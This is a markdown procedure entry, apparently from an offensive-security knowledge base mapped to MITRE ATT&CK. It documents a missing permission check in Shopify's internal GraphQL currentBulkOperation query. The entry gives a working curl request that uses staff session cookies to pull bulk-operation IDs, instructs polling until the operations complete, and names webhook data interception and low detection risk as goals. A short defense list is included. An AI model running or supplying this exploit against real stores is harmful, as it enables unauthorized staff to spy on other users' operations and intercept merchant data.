---
id: proc-uuid-3
tags:
  - graphql
  - bulk-operations
  - monitoring
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/shopify-graphql-currentbulkoperation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:25:53.523Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Query-Current-Bulk-Operation-ID-Without-Permissions

## Summary

This procedure queries the currentBulkOperation via Shopify's GraphQL API without permission checks, allowing unauthorized staff to retrieve IDs and monitor statuses of bulk operations initiated by any user.

## Description

The currentBulkOperation query endpoint does not validate user permissions, enabling visibility into ongoing or recent bulk operations across the store. This can be used to track operations started by others and correlate with webhook deliveries for data interception.

## Requirements

1. Authenticated staff session
2. Prior knowledge of bulk operation existence (from Step 2)
3. GraphQL query access

## Defense

Defensive measures and detection strategies:

- Add permission gates to queries accessing shared resources like currentBulkOperation
- Log query patterns for unauthorized access attempts
- Implement session-scoped operation visibility
- Alert on frequent polling of bulk operation statuses

## Objectives

1. Discover and monitor active bulk operations
2. Retrieve operation IDs for further querying
3. Enable synchronization with webhook notifications

## Instructions

### Step 1: Execute the Query

**Context**: Send a simple GraphQL query to fetch the current bulk operation ID, exploiting the lack of auth enforcement.

**Command** ([[commands/shopify-graphql-currentbulkoperation]]):
```bash
curl -X POST 'https://yourstore.myshopify.com/admin/internal/web/graphql/core?operation=LoginNotificationsRead' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: _shopify_s=session; _shopify_y=session' \
  -d '{"query":"query { currentBulkOperation { id } }","variables":null,"operationName":null}'
```

> Response contains currentBulkOperation.id if an operation is active. Successful return without errors confirms the bypass.

### Step 2: Poll for Completion

**Context**: Repeat the query periodically to check status changes.

**Command** (Repeat the above):
```bash
# Run the query in a loop until status changes to COMPLETED
```

> Use the ID to fetch results via additional queries or await webhook.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Valid Accounts]]

### Sub-Techniques

-

## Commands Used

- [[commands/shopify-graphql-currentbulkoperation]]

## Tools Used

-

## Tags

- [[graphql]]
- [[bulk-operations]]
- [[monitoring]]
